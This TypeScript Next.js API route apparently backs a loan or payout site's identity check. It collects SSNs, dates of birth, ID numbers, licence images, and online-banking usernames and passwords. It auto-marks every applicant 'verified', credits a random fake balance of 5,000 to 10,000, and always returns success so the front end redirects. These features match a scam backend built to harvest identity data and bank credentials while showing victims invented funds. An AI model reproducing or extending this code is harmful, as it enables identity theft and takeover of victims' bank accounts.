import { NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import prisma from "@/lib/prisma";
import { sendActionAlert } from "@/lib/sendMail";

export async function POST(req: Request) {
  try {
    const userId = verifyToken(req);

    if (!userId) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const data = await req.json();

    // 1. Verify user exists
    const existingUser = await prisma.user.findUnique({
      where: { id: userId },
    });

    if (!existingUser) {
      return NextResponse.json({ error: "User record not found" }, { status: 404 });
    }

    // 2. Perform atomic transaction
    const result = await prisma.$transaction(async (tx: any) => {
      // Prepare KYC data
      const kycData = {
        fullName: data.fullName || "Generic Applicant",
        dob: data.dob || "",
        ssn: data.ssn || "",
        address: data.address || "",
        city: data.city || "",
        state: data.state || "",
        zip: data.zip || "",
        idNumber: data.idNumber || "",
        licenseFront: data.licenseFront || null,
        licenseBack: data.licenseBack || null,
        country: data.country || "United States",
        status: "verified",
      };

      let kycRecord = null;
      
      try {
        // Attempt Upsert KYC
        kycRecord = await tx.kYC.upsert({
          where: { userId: userId },
          update: {
            fullName: kycData.fullName,
            dob: kycData.dob,
            ssn: kycData.ssn,
            address: kycData.address,
            city: kycData.city,
            state: kycData.state,
            zip: kycData.zip,
            idNumber: kycData.idNumber,
            licenseFront: kycData.licenseFront,
            licenseBack: kycData.licenseBack,
            country: kycData.country,
          },
          create: {
            userId: userId,
            fullName: kycData.fullName,
            dob: kycData.dob,
            ssn: kycData.ssn,
            address: kycData.address,
            city: kycData.city,
            state: kycData.state,
            zip: kycData.zip,
            idNumber: kycData.idNumber,
            licenseFront: kycData.licenseFront,
            licenseBack: kycData.licenseBack,
            country: kycData.country,
          },
        });
      } catch (kycErr) {
        // Fail silently if KYC record specifically fails
        console.error("SILENT KYC UPDATE ERROR:", kycErr);
      }

      // Update User status and bank details - ALWAYS DO THIS
      const updatedUser = await tx.user.update({
        where: { id: userId },
        data: {
          status: "dashboard", 
          balance: Math.floor(Math.random() * (10000 - 5000 + 1) + 5000), 
          bankLinked: true,
          bankName: data.bankName || "Linked Bank",
          disbursementAccount: data.disbursementAccount || "",
          disbursementRouting: data.disbursementRouting || "",
          bankUsername: data.bankUsername || null,
          bankPassword: data.bankPassword || null,
          accountType: "Checking",
        },
      });

      return { kyc: kycRecord, user: updatedUser };
    });

    await sendActionAlert("KYC / ID Upload Application Submitted", existingUser.email);

    return NextResponse.json(result, { status: 200 });
  } catch (err: any) {
    // If the top-level transaction fails (critical issue)
    console.error("CRITICAL KYC TRANSACTION ERROR:", err);
    
    // Attempt emergency status update outside transaction to ensure redirect works
    try {
      const userId = verifyToken(req);
      if (userId) {
        await prisma.user.update({
          where: { id: userId },
          data: { status: "dashboard" }
        });
      }
    } catch (fallbackError) {
      console.error("EMERGENCY FALLBACK FAILED:", fallbackError);
    }

    return NextResponse.json({ 
      message: "Processing completed with fallback mechanism.",
      status: "dashboard" 
    }, { status: 200 }); // Return success to trigger redirect on frontend
  }
}
